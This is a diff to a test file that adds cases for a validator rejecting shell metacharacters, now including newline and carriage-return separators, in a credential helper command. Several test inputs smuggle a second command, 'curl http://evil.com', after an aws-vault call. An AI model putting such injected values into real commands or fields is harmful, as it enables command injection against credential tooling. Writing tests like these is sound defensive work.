@@ -1041,6 +1041,14 @@ describe("containsShellMetacharacters", () => {
     expect(containsShellMetacharacters("aws-vault exec `curl http://evil.com`")).toBe(true);
   });
 
+  test("detects newline (command separator)", () => {
+    expect(containsShellMetacharacters("aws-vault exec default\ncurl http://evil.com")).toBe(true);
+  });
+
+  test("detects carriage return", () => {
+    expect(containsShellMetacharacters("aws-vault exec default\rcurl http://evil.com")).toBe(true);
+  });
+
   test("allows clean commands without metacharacters", () => {
     expect(containsShellMetacharacters("aws-vault exec default --json")).toBe(false);
   });
@@ -1145,6 +1153,38 @@ describe("helperCommand shell metacharacter rejection", () => {
         authAdapter: {
           type: AuthAdapterType.CredentialProcess,
           helperCommand: "aws-vault exec `curl http://evil.com`",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("rejects helperCommand with newline command separator", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec default\ncurl http://evil.com",
+          envVarName: "AWS_CREDENTIALS",
+        },
+      }),
+    );
+    expect(result.valid).toBe(false);
+    expect(
+      result.errors.some((e) => e.includes("shell metacharacters")),
+    ).toBe(true);
+  });
+
+  test("rejects helperCommand with carriage return", () => {
+    const result = validateManifest(
+      buildManifest({
+        authAdapter: {
+          type: AuthAdapterType.CredentialProcess,
+          helperCommand: "aws-vault exec default\rcurl http://evil.com",
           envVarName: "AWS_CREDENTIALS",
         },
       }),
